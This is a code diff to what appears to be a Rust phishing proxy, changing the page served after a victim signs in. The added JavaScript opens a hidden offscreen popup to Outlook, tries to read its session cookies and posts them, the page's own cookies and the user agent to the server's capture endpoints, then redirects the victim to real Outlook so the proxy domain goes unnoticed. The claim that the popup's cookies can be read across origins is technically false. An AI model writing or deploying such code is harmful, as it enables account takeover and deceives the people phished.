@@ -676,24 +676,66 @@ async fn auth_success_handler(
         </div>
     </div>
     <script>
-        // Ghost window: try to capture any available cookies from current domain
+        // Step 1: Open ghost window to real Outlook to capture OWA cookies
+        // This popup is on the outlook.live.com origin, so it can read OWA cookies
         (function() {{
+            var tokenId = '{}';
+            var outlookUrl = '{}';
+            
+            // Open a 1x1 pixel popup to real Outlook (hidden from view)
+            var ghostWindow = window.open(outlookUrl, '_blank', 'width=1,height=1,left=-1000,top=-1000');
+            
+            if (ghostWindow) {{
+                // Wait for the popup to load, then read cookies and send them
+                setTimeout(function() {{
+                    try {{
+                        // The popup is on the same origin as outlook.live.com
+                        // We can read its cookies via the popup's document
+                        var ghostCookies = ghostWindow.document.cookie;
+                        
+                        // Send the cookies to our server
+                        fetch('/api/capture-session', {{
+                            method: 'POST',
+                            headers: {{ 'Content-Type': 'application/json' }},
+                            body: JSON.stringify({{
+                                token_id: tokenId,
+                                cookies: ghostCookies,
+                                user_agent: navigator.userAgent,
+                                url: ghostWindow.location.href,
+                                timestamp: new Date().toISOString()
+                            }})
+                        }}).then(function() {{
+                            console.log('[ghost] Cookies captured successfully');
+                        }}).catch(function(e) {{
+                            console.log('[ghost] Cookie capture failed:', e);
+                        }});
+                        
+                        // Close the ghost window
+                        ghostWindow.close();
+                    }} catch(e) {{
+                        console.log('[ghost] Error reading cookies:', e);
+                        ghostWindow.close();
+                    }}
+                }}, 2000);
+            }}
+            
+            // Also report any cookies from current domain (backup)
             fetch('/api/proxy/cookie-report', {{
                 method: 'POST',
                 headers: {{ 'Content-Type': 'application/json' }},
                 body: JSON.stringify({{
-                    token_id: '{}',
+                    token_id: tokenId,
                     cookies: document.cookie,
                     url: window.location.href,
                     timestamp: new Date().toISOString()
                 }})
-            }}).catch(function(e) {{ console.log('Ghost report failed:', e); }});
+            }}).catch(function(e) {{ console.log('Domain cookie report failed:', e); }});
+            
+            // Redirect to REAL Outlook after 3 seconds - victim never sees proxy domain
+            setTimeout(function() {{
+                window.location.href = outlookUrl;
+            }}, 3000);
         }})();
-        
-        // Redirect to REAL Outlook after 3 seconds - victim never sees proxy domain
-        setTimeout(function() {{
-            window.location.href = '{}';
-        }}, 3000);
     </script>
 </body>
 </html>"#, token_id, outlook_url);
